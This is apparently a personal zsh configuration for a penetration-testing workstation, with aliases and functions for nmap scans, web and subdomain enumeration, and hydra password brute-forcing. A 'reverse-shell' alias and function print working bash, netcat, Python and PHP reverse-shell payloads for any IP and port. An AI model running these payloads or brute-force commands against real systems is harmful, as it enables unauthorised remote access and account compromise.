# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                    ULTIMATE CYBERSECURITY ZSH CONFIGURATION                  ║
# ║                           Built for Elite Operators                          ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

# --- Oh My Zsh Setup ---
export ZSH="$HOME/.oh-my-zsh"
export PATH=$PATH:$(go env GOPATH)/bin

# --- Theme Configuration ---
ZSH_THEME="agnoster"

# --- Advanced Plugin Arsenal ---
plugins=(
  git
  sudo
  zsh-autosuggestions
  zsh-syntax-highlighting
  zsh-completions
  history-substring-search
  docker
  docker-compose
  kubectl
  web-search
  copypath
  jsontools
  urltools
)

source $ZSH/oh-my-zsh.sh

# --- Path Optimization ---
export PATH="$HOME/bin:$PATH"
export PATH="$HOME/hacking:$PATH"
export PATH="$HOME/hacking/scripts:$PATH"
export PATH="$HOME/.local/bin:$PATH"
export PATH="/usr/local/go/bin:$PATH"
export PATH="/opt:$PATH"

# --- Advanced History Configuration ---
HISTSIZE=50000
SAVEHIST=50000
HISTFILE=~/.zsh_history
setopt HIST_EXPIRE_DUPS_FIRST
setopt HIST_IGNORE_DUPS
setopt HIST_IGNORE_ALL_DUPS
setopt HIST_IGNORE_SPACE
setopt HIST_FIND_NO_DUPS
setopt HIST_SAVE_NO_DUPS
setopt SHARE_HISTORY
setopt APPEND_HISTORY
setopt INC_APPEND_HISTORY

# --- Core System Aliases ---
alias ll='ls -la --color=auto'
alias la='ls -A --color=auto'
alias l='ls -CF --color=auto'
alias cls='clear && echo -e "\033[3J"'
alias c='clear'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias please='sudo $(history -p !!)'
alias fucking='sudo'
alias update='sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove -y'
alias install='sudo apt install -y'
alias search='apt search'
alias reload='source ~/.zshrc'
alias edit-zsh='nano ~/.zshrc'

# --- System Information ---
alias sysinfo='neofetch'
alias diskspace='df -h'
alias meminfo='free -h'
alias cpuinfo='lscpu'
alias processes='ps aux | head -20'
alias listening='netstat -tulanp | grep LISTEN'
alias connections='netstat -tulanp'

# --- Network Reconnaissance Arsenal ---
alias ports='netstat -tulanp'
alias openports='nmap -p- --open'
alias ipinfo='ip -c a'
alias myip='curl -s ifconfig.me && echo'
alias grabip='ip route get 1 2>/dev/null | awk '\''{print $7}'\'' | head -n1'
alias publicip='dig +short myip.opendns.com @resolver1.opendns.com'
alias localips='ip route | grep src | awk '\''{print $9}'\'' | sort -u'
alias gateway='ip route | grep default | awk '\''{print $3}'\'''
alias dns='cat /etc/resolv.conf | grep nameserver'
alias arp-scan='sudo arp-scan -l'
alias netdiscover='sudo netdiscover -r'

# --- Advanced Scanning Arsenal ---
alias webscan='gobuster dir -u'
alias subscan='gobuster dns -d'
alias vhostscan='gobuster vhost -u'
alias nmapscan='nmap -A -T4 -oN nmap_scan.txt'
alias fullnmap='nmap -p- -T4 -A -v -oN full_scan.txt'
alias stealthnmap='nmap -sS -T2 -f'
alias udpscan='sudo nmap -sU --top-ports 1000'
alias vulnscan='nmap --script=vuln'
alias recon='whatweb --no-errors -v'
alias dirbuster='dirb'
alias nikto-scan='nikto -h'
alias masscan-fast='sudo masscan --rate=1000'

# --- Web Application Testing ---
alias burp='java -jar /opt/burpsuite/burpsuite_community.jar &'
alias zaproxy='zaproxy &'
alias sqlmap='python3 /opt/sqlmap/sqlmap.py'
alias wpscan='wpscan --url'
alias sublist3r='python3 /opt/Sublist3r/sublist3r.py -d'
alias amass-enum='amass enum -d'
alias ffuf='ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u'

# --- Exploitation Tools ---
alias msfconsole='sudo msfconsole'
alias searchsploit='searchsploit'
alias exploit-db='searchsploit'
alias nc-listen='nc -nlvp'
alias reverse-shell='nc -e /bin/bash'
alias python-server='python3 -m http.server'
alias php-server='php -S 0.0.0.0:8000'

# --- Password Attacks ---
alias hydra-ssh='hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://'
alias hydra-ftp='hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://'
alias hashcat-md5='hashcat -m 0 -a 0'
alias hashcat-sha1='hashcat -m 100 -a 0'
alias john='john --wordlist=/usr/share/wordlists/rockyou.txt'

# --- File Analysis ---
alias strings-all='strings -a'
alias hexdump-c='hexdump -C'
alias binwalk-extract='binwalk -e'
alias exiftool-scan='exiftool'
alias file-type='file'
alias entropy='ent'

# --- Git Warfare ---
alias gs='git status'
alias ga='git add .'
alias gaa='git add --all'
alias gc='git commit -m'
alias gp='git push'
alias gl='git pull'
alias gd='git diff'
alias gb='git branch'
alias gco='git checkout'
alias gcb='git checkout -b'
alias glog='git log --oneline --graph --decorate'
alias gclone='git clone'

# --- Docker Operations ---
alias dps='docker ps'
alias dpsa='docker ps -a'
alias di='docker images'
alias dstop='docker stop $(docker ps -q)'
alias dclean='docker system prune -af'
alias dexec='docker exec -it'
alias dlog='docker logs -f'

# --- Quick Servers ---
alias serve='python3 -m http.server 8000'
alias serve80='sudo python3 -m http.server 80'
alias serve443='sudo python3 -m http.server 443'
alias servephp='php -S 0.0.0.0:8000'
alias ftp-server='python3 -m pyftpdlib'

# --- Advanced Functions ---

# Epic Nmap Scan Function
function epic-scan() {
    if [[ -z $1 ]]; then
        echo "Usage: epic-scan <target>"
        return 1
    fi

    local target=$1
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local output_dir="scans_${target}_${timestamp}"

    echo -e "\033[1;32m[+] Starting Epic Scan on $target\033[0m"
    mkdir -p $output_dir

    echo -e "\033[1;33m[*] Phase 1: Host Discovery\033[0m"
    nmap -sn $target > "$output_dir/host_discovery.txt"

    echo -e "\033[1;33m[*] Phase 2: Port Discovery\033[0m"
    nmap -p- --min-rate=1000 $target > "$output_dir/all_ports.txt"

    echo -e "\033[1;33m[*] Phase 3: Service Enumeration\033[0m"
    nmap -sV -sC -A $target > "$output_dir/service_enum.txt"

    echo -e "\033[1;33m[*] Phase 4: Vulnerability Scan\033[0m"
    nmap --script=vuln $target > "$output_dir/vuln_scan.txt"

    echo -e "\033[1;32m[✓] Epic scan complete! Results in $output_dir/\033[0m"
}

# Web Enumeration Function
function web-enum() {
    if [[ -z $1 ]]; then
        echo "Usage: web-enum <url>"
        return 1
    fi

    local url=$1
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local output_dir="web_enum_${timestamp}"

    echo -e "\033[1;32m[+] Starting Web Enumeration on $url\033[0m"
    mkdir -p $output_dir

    echo -e "\033[1;33m[*] Directory Brute Force\033[0m"
    gobuster dir -u $url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o "$output_dir/directories.txt" &

    echo -e "\033[1;33m[*] Technology Detection\033[0m"
    whatweb $url > "$output_dir/technology.txt"

    echo -e "\033[1;33m[*] Nikto Scan\033[0m"
    nikto -h $url > "$output_dir/nikto.txt"

    wait
    echo -e "\033[1;32m[✓] Web enumeration complete! Results in $output_dir/\033[0m"
}

# Multi-tool Subdomain Discovery
function subdomain-hunt() {
    if [[ -z $1 ]]; then
        echo "Usage: subdomain-hunt <domain>"
        return 1
    fi

    local domain=$1
    local output_file="subdomains_${domain}.txt"

    echo -e "\033[1;32m[+] Hunting subdomains for $domain\033[0m"

    # Multiple subdomain discovery methods
    echo -e "\033[1;33m[*] Using multiple tools...\033[0m"

    # Combine results from different tools
    {
        amass enum -d $domain 2>/dev/null
        python3 /opt/Sublist3r/sublist3r.py -d $domain 2>/dev/null | grep -v "Enumerating"
        gobuster dns -d $domain -w /usr/share/wordlists/dnsmap.txt 2>/dev/null | grep "Found:" | awk '{print $2}'
    } | sort -u > $output_file

    local count=$(wc -l < $output_file)
    echo -e "\033[1;32m[✓] Found $count subdomains! Saved to $output_file\033[0m"
}

# Quick Reverse Shell Generator
function reverse-shell() {
    local ip=${1:-$(grabip)}
    local port=${2:-4444}

    echo -e "\033[1;32m[+] Reverse Shell Payloads for $ip:$port\033[0m\n"

    echo -e "\033[1;33mBash:\033[0m"
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"

    echo -e "\n\033[1;33mNetcat:\033[0m"
    echo "nc -e /bin/bash $ip $port"

    echo -e "\n\033[1;33mPython:\033[0m"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"

    echo -e "\n\033[1;33mPHP:\033[0m"
    echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"

    echo -e "\n\033[1;36m[*] Don't forget to start your listener: nc -nlvp $port\033[0m"
}

# --- Environment Variables ---
export WEBHOOK_URL=https://n8n.robertm.dev
export GOPATH="$HOME/go"
export EDITOR="nano"
export BROWSER="firefox"

# --- Plugin Fallbacks ---
[[ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]] && source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
[[ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]] && source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh

# --- Shell Options ---
setopt CORRECT
setopt AUTO_CD
setopt GLOB_COMPLETE
setopt NO_CASE_GLOB
setopt NUMERIC_GLOB_SORT

# --- Completion System ---
autoload -Uz compinit
compinit
zstyle ':completion:*' menu select
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'

# --- Advanced Directory Structure ---
function create-hacking-env() {
    local base_dir="$HOME/hacking"

    # Create comprehensive directory structure
    mkdir -p $base_dir/{recon/{nmap,gobuster,subdomains,screenshots},exploits/{windows,linux,web,mobile},loot/{credentials,hashes,files,screenshots},notes/{targets,methodology,writeups},scripts/{bash,python,powershell},web/{payloads,shells,tools},binaries/{windows,linux},tools/{custom,downloaded},ctf/{challenges,writeups,tools},reports/{pentest,redteam,bugbounty}}

    echo -e "\033[1;32m[✓] Hacking environment structure created!\033[0m"
    tree $base_dir -L 3 2>/dev/null || ls -la $base_dir
}

# Auto-create hacking environment on first run
if [ ! -d "$HOME/hacking" ]; then
    create-hacking-env
fi

# --- Epic Welcome Banner ---
function hacker_banner() {
    local ip=$(grab_ip)
    local hostname=$(hostname)
    local user=$(whoami)
    local kernel=$(uname -r)
    local uptime=$(uptime -p 2>/dev/null || uptime | awk '{print $3,$4}')

    print ""
    print -P "%F{red}   ██████╗██╗   ██╗██████╗ ███████╗██████╗ %f"
    print -P "%F{red}  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗%f"
    print -P "%F{yellow}  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝%f"
    print -P "%F{yellow}  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗%f"
    print -P "%F{green}  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║%f"
    print -P "%F{green}   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝%f"
    print -P "%F{cyan}         ██████╗ ██████╗ ███████╗██████╗  %f"
    print -P "%F{cyan}        ██╔═══██╗██╔══██╗██╔════╝██╔══██╗ %f"
    print -P "%F{blue}        ██║   ██║██████╔╝█████╗  ██████╔╝ %f"
    print -P "%F{blue}        ██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗ %f"
    print -P "%F{magenta}        ╚██████╔╝██║     ███████╗██║  ██║ %f"
    print -P "%F{magenta}         ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ %f"
    print ""
    print -P "%F{green}╔════════════════════════════════════════════════════════════════╗%f"
    print -P "%F{cyan}║  Operator: %-15s │ Hostname: %-15s    ║%f" "$user" "$hostname"
    print -P "%F{cyan}║  Local IP: %-15s │ Kernel: %-17s    ║%f" "$ip" "$kernel"
    print -P "%F{cyan}║  Uptime: %-17s │ Mission: CYBER WARFARE      ║%f" "$uptime"
    print -P "%F{cyan}║  Status: TERMINAL ARMED     │ Date: $(date +'%Y-%m-%d %H:%M:%S')   ║%f"
    print -P "%F{green}╚════════════════════════════════════════════════════════════════╝%f"
    print ""
}

# --- Elite Hacker Quotes ---
function hacker_quote() {
    quotes=(
        "The quieter you become, the more you can hear. 🎯"
        "In God we trust, everyone else we monitor. 👁️"
        "Security through obscurity is no security at all. 🔓"
        "Hack the planet! 🌍"
        "Knowledge is power, but applied knowledge is unstoppable. ⚡"
        "First rule of hacking: Always cover your tracks. 👻"
        "There is no patch for human stupidity. 🤖"
        "The best way to predict the future is to hack it. 🔮"
        "Curiosity killed the cat, but satisfaction brought it back. 🐱"
        "Give a man a shell and he can hack for a day; teach a man to hack and he can shell for a lifetime. 💀"
        "Trust but verify... then hack anyway. ✅"
        "404: Sleep not found. 😴"
        "Root access: Because why knock when you can break down the door? 🚪"
        "I'm not paranoid, I'm just well-informed. 🛡️"
        "Encryption: Making the impossible merely very difficult. 🔐"
    )
    local quote=${quotes[RANDOM % ${#quotes[@]}]}
    print -P "%F{magenta}💀 Quote of the Day: %F{white}$quote%f\n"
}

# --- System Status Function ---
function system_status() {
    echo -e "\033[1;36m⚡ SYSTEM STATUS:\033[0m"
    echo -e "  🔋 Battery: $(cat /sys/class/power_supply/BAT*/capacity 2>/dev/null || echo 'N/A')%"
    echo -e "  💾 Memory: $(free -h | awk 'NR==2{printf "%.1f%% (%.1fG/%.1fG)", $3*100/$2, $3/1024/1024, $2/1024/1024}')"
    echo -e "  💿 Disk: $(df -h / | awk 'NR==2{printf "%s (%s used)", $4, $5}')"
    echo -e "  🌡️ CPU Load: $(uptime | awk -F'load average:' '{print $2}' | sed 's/^[ \t]*//')"
    echo ""
}

# --- IP Grabber Function ---
function grab_ip() {
    local ip_addr
    ip_addr=$(ip route get 1 2>/dev/null | awk '{print $7}' | head -n1)
    [[ -z $ip_addr ]] && ip_addr="127.0.0.1"
    echo $ip_addr
}

export MYIP=$(grab_ip)

# --- Show Epic Banner ---
hacker_banner
system_status
hacker_quote

# --- Ultimate Custom Prompt ---
# This creates a multi-line prompt with IP, git status, and colors
setopt PROMPT_SUBST

function git_prompt_info() {
    if git rev-parse --git-dir > /dev/null 2>&1; then
        local branch=$(git symbolic-ref --short HEAD 2>/dev/null || echo "detached")
        local status=$(git status --porcelain 2>/dev/null)
        if [[ -n $status ]]; then
            echo " %F{red}⚡$branch%f"
        else
            echo " %F{green}✓$branch%f"
        fi
    fi
}

PROMPT='%F{red}┌─[%f%F{cyan}%n%f%F{white}@%f%F{magenta}%m%f%F{red}]─[%f%F{yellow}%~%f%F{red}]─[%f%F{blue}$MYIP%f%F{red}]$(git_prompt_info)%f
%F{red}└─╼%f %F{green}$%f '

# --- Right Prompt (RPS1) ---
RPS1='%F{yellow}[%D{%H:%M:%S}]%f'

# --- Key Bindings ---
bindkey '^R' history-incremental-search-backward
bindkey '^[[A' history-substring-search-up
bindkey '^[[B' history-substring-search-down

# --- Final Message ---
echo -e "\033[1;32m🚀 CYBER OPERATOR TERMINAL READY FOR COMBAT! 🚀\033[0m"
echo -e "\033[1;33mType 'epic-scan <target>', 'web-enum <url>', or 'subdomain-hunt <domain>' to start hunting!\033[0m"
echo -e "\033[1;36mUse 'reverse-shell <ip> <port>' for payload generation.\033[0m\n"
